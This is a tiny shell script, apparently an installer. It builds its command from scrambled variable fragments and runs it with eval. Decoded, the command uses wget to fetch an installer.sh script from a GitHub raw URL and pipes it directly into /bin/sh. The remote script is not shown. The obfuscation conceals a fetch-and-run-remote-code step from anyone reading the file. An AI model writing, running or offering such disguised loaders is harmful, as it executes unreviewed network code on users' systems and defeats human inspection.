z="
";Qz='bil/';Sz='/ins';Cz='ps:/';Vz='h -q';Wz='O - ';Tz='tall';Fz='hubu';Zz='h';Dz='/raw';Az='wget';Ez='.git';Gz='serc';Mz='/cha';Kz='miln';Rz='main';Oz='-emi';Iz='nt.c';Pz='l-na';Bz=' htt';Jz='om/e';Uz='er.s';Nz='nnel';Yz='in/s';Xz='| /b';Lz='abil';Hz='onte';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz"